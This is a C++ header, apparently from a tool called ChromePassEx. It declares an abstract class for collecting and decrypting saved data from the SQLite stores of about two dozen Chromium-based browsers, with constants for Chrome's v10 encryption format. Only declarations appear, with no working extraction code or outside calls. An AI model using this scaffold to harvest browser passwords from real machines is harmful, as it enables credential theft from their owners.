#pragma once
#include "WinApiImport.h"
#include "sqlite3.h"
#include <memory>
#include "Base64.h"
#include "cJSON.h"
#include <string>
#include <vector>

#include "ChromeDecrypt.h"
#ifdef ChromePassEx_EXPORTS

#define EXPORT_F __declspec(dllexport)

#else

#define EXPORT_F 

#endif


#define V10_LEN 3
#define NONCE_LEN 12
#define MAX_SIZE 1024

template <class T>
class  EXPORT_F ChromeCollecter 
{
public:
	ChromeCollecter() = default;

	 ~ChromeCollecter() = default;

	 virtual std::vector<T> collectData() =0 ;

protected:

	virtual void collectFromPath(const std::string& chromePath) = 0;
	virtual bool getDbPath(const std::string& chromePath)=0 ;
	std::vector<T> m_collectedData;
	std::string m_chromeSqlitePath;
	ChromeDecrypt m_decryptor;
	const std::vector<std::string> m_chromeList{

		"\\Google\\Chrome",
		"\\Google(x86)\\Chrome",
		"\\Chromium",
		"\\Microsoft\\Edge",
		"\\BraveSoftware\\Brave-Browser",
		"\\Epic Privacy Browser",
		"\\Amigo",
		"\\Vivaldi",
		"\\Orbitum",
		"\\Mail.Ru\\Atom",
		"\\Kometa",
		"\\Comodo\\Dragon",
		"\\Torch",
		"\\Comodo",
		"\\Slimjet",
		"\\360Browser\\Browser",
		"\\Maxthon3",
		"\\K-Melon",
		"\\Sputnik\\Sputnik",
		"\\Nichrome",
		"\\CocCoc\\Browser",
		"\\uCozMedia\\Uran",
		"\\Chromodo",
		"\\Yandex\\YandexBrowser"
	};
	
};



